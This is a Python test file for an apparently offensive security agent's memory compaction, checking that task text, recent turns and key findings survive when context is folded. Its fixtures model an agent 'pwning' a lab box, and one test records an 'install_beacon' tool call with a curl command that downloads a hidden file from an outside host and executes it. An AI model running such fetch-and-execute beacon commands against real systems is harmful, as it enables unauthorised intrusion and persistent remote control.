"""Compaction keeps a long agent inside its window without forgetting it all.

A 67-minute single-agent run pinned its prompt at the model's ceiling
(234k tokens) while `_compact_memory` was an empty `pass` called every 50
iterations. These hold the real implementation to three things: it triggers
only past the threshold, it always keeps the task and a verbatim recent
tail, and what it drops survives as findings, not silence.
"""

from __future__ import annotations

from agent_framework.agents.state import AgentContext


def _exchange(ctx: AgentContext, i: int, finding: str | None = None):
    ctx.append_message("assistant", f"Step {i}: probing the target service.")
    result = "<tool_result><tool_name>terminal</tool_name>"
    if finding:
        result += f"<result>{finding}</result>"
    else:
        result += "<result>scan progress lines</result>"
    ctx.append_message("user", result + "</tool_result>")


def _build(turns: int) -> AgentContext:
    ctx = AgentContext()
    ctx.append_message(
        "user",
        "Current Objective:\n<task>pwn the box</task>\nObjective: pwn the box",
    )
    for i in range(turns):
        finding = "password: hunter2" if i == turns // 2 else None
        _exchange(ctx, i, finding)
    return ctx


def test_below_threshold_nothing_folds():
    ctx = _build(turns=10)
    assert ctx.compact() == 0
    assert len(ctx.messages) == 21  # task + 10 x (assistant+user)


def test_over_threshold_keeps_task_tail_and_digest():
    ctx = _build(turns=60)
    folded = ctx.compact()

    assert folded > 0
    roles = [m["role"] for m in ctx.messages]
    assert len(ctx.messages) < 60
    # the task survives verbatim
    assert any("<task>" in str(m.get("content")) for m in ctx.messages[:3])
    # a verbatim recent tail remains
    assert roles[-1] == "user" and roles[-2] == "assistant"
    # the digest carries the discovery that mattered
    digest = next(m for m in ctx.messages
                  if "[Context compacted" in str(m.get("content")))
    assert "password: hunter2" in str(digest["content"])
    assert "Step 0" in str(digest["content"])


def test_compaction_is_idempotent_once_small():
    ctx = _build(turns=80)
    first = ctx.compact()
    assert first > 0
    size_after_first = len(ctx.messages)
    second = ctx.compact()
    assert second == 0 or len(ctx.messages) <= size_after_first + 1


def test_compaction_keeps_exact_operational_artifacts():
    ctx = _build(turns=80)
    command = "curl -sf -o /var/tmp/.i http://172.28.0.1:39439/ && exec /var/tmp/.i"
    ctx.record_tool_use({
        "toolName": "install_beacon",
        "args": {"address": "billing.nexus.htb (172.28.0.10)"},
    })
    ctx.record_tool_result(
        "install_beacon",
        {"address": "billing.nexus.htb (172.28.0.10)"},
        {"ok": True, "command": command, "address": "172.28.0.10"},
    )
    ctx.record_tool_use({
        "toolName": "terminal",
        "args": {"command": command},
    })
    ctx.record_tool_result(
        "terminal",
        {"command": command},
        {"ok": True, "status": "running", "exit_code": None,
         "terminal_id": "job-1"},
    )

    assert ctx.compact() > 0
    digest = next(
        m for m in ctx.messages
        if "[Context compacted" in str(m.get("content"))
    )
    text = str(digest["content"])
    assert command in text
    assert "billing.nexus.htb" in text
    assert "status" in text


def test_compaction_does_not_start_with_orphaned_tool_result():
    ctx = _build(turns=80)
    ctx.append_message("assistant", "I will run the next check.")
    ctx.append_message("tool_call", {
        "tool_name": "terminal", "kwargs": {"command": "echo marker"},
    })
    ctx.append_message("tool_result", {
        "tool_name": "terminal", "isError": False,
        "result": {"status": "completed", "content": "marker"},
    })
    ctx.append_message("user", "Tool Results:\n<tool_result>marker</tool_result>")

    assert ctx.compact() > 0
    digest_index = next(
        i for i, m in enumerate(ctx.messages)
        if "[Context compacted" in str(m.get("content"))
    )
    tail = ctx.messages[digest_index + 1:]
    assert not tail or tail[0].get("role") not in {"tool_call", "tool_result"}


def test_stale_action_checkpoint_requests_one_generic_pivot():
    ctx = AgentContext()
    args = {"command": "probe", "timeout": 120}

    for _ in range(ctx.STALE_ACTION_LIMIT - 1):
        ctx.record_tool_result("terminal", args, {
            "ok": False, "error": "failed",
        }, is_error=True)

    assert ctx.tactical_memory["stale_action_streak"] == (
        ctx.STALE_ACTION_LIMIT - 1)
    assert "pivot_required" not in ctx.tactical_memory or not ctx.tactical_memory[
        "pivot_required"]

    ctx.record_tool_result("terminal", args, {
        "ok": False, "error": "failed",
    }, is_error=True)
    assert ctx.tactical_memory["pivot_required"] is True
    assert ctx.consume_pivot_reminder() is True
    assert ctx.consume_pivot_reminder() is False

    ctx.record_tool_result("terminal", {
        "command": "different-probe", "timeout": 120,
    }, {"ok": True, "status": "completed"})
    assert ctx.tactical_memory["stale_action_streak"] == 0
    assert ctx.tactical_memory["pivot_required"] is False


def test_equivalent_successful_outputs_are_stale_but_running_polls_are_neutral():
    ctx = AgentContext()
    ctx.record_tool_result(
        "terminal", {"command": "first"},
        {"ok": True, "status": "completed", "stdout": "no result"},
    )
    assert ctx.tactical_memory["stale_action_streak"] == 0

    ctx.record_tool_result(
        "terminal", {"command": "second"},
        {"ok": True, "status": "completed", "stdout": "no  result"},
    )
    assert ctx.tactical_memory["stale_action_streak"] == 1

    ctx.record_tool_result(
        "terminal", {"command": "poll"},
        {"ok": True, "status": "running", "stdout": ""},
    )
    assert ctx.tactical_memory["stale_action_streak"] == 1
